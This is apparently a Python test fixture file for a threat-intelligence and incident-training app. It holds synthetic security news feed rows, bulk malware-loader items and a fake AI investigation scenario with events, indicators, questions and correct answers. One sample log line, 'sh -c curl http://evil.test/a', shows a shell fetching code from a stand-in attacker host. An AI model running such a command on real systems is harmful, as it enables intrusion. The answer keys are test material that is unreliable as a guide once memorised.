"""Synthetic feed data + fake AI generation used only by the test suite."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone


def now() -> datetime:
    return datetime.now(timezone.utc)


def feed_row(
    article_id: str,
    title: str,
    description: str = "",
    source: str = "TestWire",
    hours_ago: float = 1.0,
    link: str | None = None,
) -> dict:
    published = now() - timedelta(hours=hours_ago)
    return {
        "id": article_id,
        "title": title,
        "link": link or f"https://news.example.test/{article_id}",
        "description": description,
        "published_at": published.strftime("%Y-%m-%d %H:%M:%S"),
        "source": source,
        "image_url": None,
        "categories": ["technology"],
    }


# -- realistic-shaped sample feeds ---------------------------------------------

RANSOMWARE_CAMPAIGN = [
    feed_row(
        "rw-1",
        "Akira ransomware campaign hits manufacturing firms worldwide",
        "The Akira ransomware group has encrypted systems at dozens of manufacturers. "
        "Researchers observed the actors abusing VPN appliances for initial access and "
        "publishing stolen data on their leak site. Indicators include 45.61.136.12 and "
        "akira-leaks.top with hash d41d8cd98f00b204e9800998ecf8427e.",
        source="TestWire",
        hours_ago=2,
    ),
    feed_row(
        "rw-2",
        "Akira ransomware attacks surge against manufacturing sector",
        "A new wave of Akira ransomware attacks has been reported across Europe. "
        "The double extortion campaign encrypts files and threatens data leaks.",
        source="SecurityDaily",
        hours_ago=3,
    ),
    feed_row(
        "rw-3",
        "Manufacturers warned over Akira ransomware double extortion",
        "Incident response teams report Akira ransomware intrusions beginning with "
        "compromised VPN credentials and lateral movement over RDP.",
        source="CyberJournal",
        hours_ago=4,
    ),
]

ZERO_DAY_CVE = [
    feed_row(
        "cve-1",
        "Critical zero-day in enterprise gateway actively exploited (CVE-2026-1234)",
        "CVE-2026-1234 is a critical unauthenticated remote code execution vulnerability "
        "being exploited in the wild against internet-facing appliances. Attackers deploy "
        "web shells and pivot inside the network. Detection guidance includes monitoring "
        "logs for requests to /remote/login and connections to 185.220.101.44.",
        source="TestWire",
        hours_ago=1,
    ),
    feed_row(
        "cve-2",
        "Vendor ships emergency patch for CVE-2026-1234 exploitation",
        "Following confirmed active exploitation of CVE-2026-1234, the vendor released an "
        "emergency patch. Thousands of organizations worldwide remain exposed.",
        source="PatchNews",
        hours_ago=2,
    ),
]

CLOUD_IDENTITY = [
    feed_row(
        "cloud-1",
        "Cloud credential theft campaign abuses OAuth tokens across Entra ID tenants",
        "A phishing-driven campaign is stealing session tokens and OAuth consent grants to "
        "access Microsoft 365 mailboxes. Analysts recommend hunting sign-in logs for "
        "impossible travel and reviewing consented applications. Malicious domain: "
        "login-verify.example-cdn.top",
        source="CloudSecToday",
        hours_ago=5,
    ),
]

NOISE = [
    feed_row(
        "noise-1",
        "Security vendor announces Series B funding round",
        "The startup raised capital to expand its market presence. Market size is expected "
        "to grow at a CAGR of 12 percent.",
        source="BizWire",
        hours_ago=6,
    ),
    feed_row(
        "noise-2",
        "Best antivirus deals this Black Friday",
        "A buyer guide to discount antivirus subscriptions.",
        source="DealSite",
        hours_ago=7,
    ),
]


# General news that keyword search returns because a term appears in passing.
OFF_TOPIC = [
    feed_row(
        "off-1",
        "7 Ways Content Piracy is Reshaping Africa's Entertainment Industry",
        "Producers say piracy drains revenue from streaming sources and resources, while "
        "studios exploit new distribution deals to protect their intellectual property.",
        source="CultureDesk",
        hours_ago=2,
    ),
    feed_row(
        "off-2",
        "2026 Election Questionnaire: State Representative candidate",
        "The candidate discusses energy security, affordability and the threat of rising "
        "costs, and says the state should attack the housing shortage.",
        source="LocalNews",
        hours_ago=3,
    ),
    feed_row(
        "off-3",
        "Voter turnout suggests most of us don't care about city services",
        "How bad would things have to get to improve voter turnout? Community association "
        "leaders and the captain of the local team weigh in.",
        source="CityPress",
        hours_ago=4,
    ),
    feed_row(
        "off-4",
        "Striker's late attack seals win as defence holds firm",
        "The team exploited gaps in the security of the opposing back line.",
        source="SportsDesk",
        hours_ago=5,
    ),
    feed_row(
        "off-5",
        "Climate vulnerability threatens security of coastal towns",
        "The threat of flooding exposes the vulnerability of housing.",
        source="ClimateWire",
        hours_ago=5,
    ),
]

# Real incidents that carry no CVE, known family, actor or indicator.
ENTITY_FREE_INCIDENTS = [
    feed_row(
        "inc-1",
        "New infostealer spreads through cracked software downloads",
        "The malware steals browser passwords and crypto wallets.",
        hours_ago=2,
    ),
    feed_row(
        "inc-2",
        "City council systems offline after cyber-attack",
        "Officials said the incident disrupted services and an investigation is under way.",
        hours_ago=2,
    ),
    feed_row(
        "inc-3",
        "Cisco fixes critical vulnerability in IOS XE web UI",
        "Attackers could exploit the flaw to gain admin access; Cisco urges customers to patch.",
        hours_ago=2,
    ),
]


def mixed_feed() -> list[dict]:
    return [*ZERO_DAY_CVE, *RANSOMWARE_CAMPAIGN, *CLOUD_IDENTITY, *NOISE]


def bulk_feed(count: int = 100) -> list[dict]:
    """A large feed of distinct low/medium-value threats plus the curated ones."""
    rows = mixed_feed()
    for index in range(count - len(rows)):
        rows.append(feed_row(
            f"bulk-{index}",
            f"Malware loader {index} distributed through malicious installers",
            f"Researchers documented loader variant {index} delivering an infostealer "
            "payload through trojanised installers. The malware contacts a "
            f"command-and-control server at 203.0.113.{index % 250}.",
            source=f"Outlet{index % 7}",
            hours_ago=1 + (index % 20),
        ))
    return rows


# -- fake AI scenario payload ---------------------------------------------------

def ai_scenario_payload(title: str = "Generated Investigation") -> dict:
    """Shaped exactly like the AI provider JSON the real generator expects."""
    stamp = (now() - timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
    return {
        "summary": f"{title}: an adversary gained access and moved laterally before detection.",
        "assets": [{"name": "WEB-01", "type": "server", "criticality": "high"}],
        "attack_steps": [
            {"order": 1, "technique": "T1190", "description": "Exploited the public gateway"},
            {"order": 2, "technique": "T1059", "description": "Executed a shell payload"},
        ],
        "timeline": [
            {"timestamp": stamp, "description": "Initial exploitation", "mitre_id": "T1190"},
        ],
        "events": [
            {
                "timestamp": stamp, "event_type": "web_request", "source": "nginx",
                "host": "WEB-01", "user": "-", "message": "POST /remote/login 200",
                "mitre_id": "T1190", "is_malicious": True,
            },
            {
                "timestamp": stamp, "event_type": "process", "source": "sysmon",
                "host": "WEB-01", "user": "svc_web", "message": "sh -c curl http://evil.test/a",
                "mitre_id": "T1059", "is_malicious": True,
            },
        ],
        "artifacts": [
            {"name": "webshell.php", "artifact_type": "file", "host": "WEB-01", "content": "<?php ?>"},
        ],
        "traffic": [
            {
                "timestamp": stamp, "src_ip": "10.10.0.5", "dst_ip": "185.220.101.44",
                "src_port": 51234, "dst_port": 443, "protocol": "tcp", "packets": 42,
                "bytes": 8192, "direction": "outbound", "summary": "C2 beacon",
                "mitre_id": "T1071", "is_malicious": True,
            },
        ],
        "traces": [
            {
                "timestamp": stamp, "trace_type": "process", "host": "WEB-01",
                "process_name": "sh", "parent_process": "nginx", "command_line": "sh -c curl",
                "network_target": "185.220.101.44", "summary": "Suspicious child process",
                "mitre_id": "T1059", "is_malicious": True,
            },
        ],
        "indicators": [
            {"ioc_type": "ip", "value": "185.220.101.44", "description": "C2", "mitre_id": "T1071"},
        ],
        "alerts": [
            {
                "title": "Web shell activity", "severity": "critical",
                "description": "Suspicious POST followed by shell execution",
                "mitre_id": "T1190", "rule_name": "webshell_detect",
            },
        ],
        "questions": [
            {
                "order": 1, "question_text": "Which host was compromised first?",
                "question_type": "text", "choices": [], "correct_answer": "WEB-01",
                "required_keywords": ["web-01"], "points": 10, "hint": "Check the web tier",
            },
            {
                "order": 2, "question_text": "Which ATT&CK technique was used for initial access?",
                "question_type": "mitre", "choices": [], "correct_answer": "T1190",
                "required_keywords": [], "points": 10, "hint": None,
            },
        ],
        "containment_actions": [
            {
                "action_type": "isolate_host", "target": "WEB-01",
                "description": "Isolate the compromised host", "is_correct": "positive", "points": 10,
            },
        ],
    }
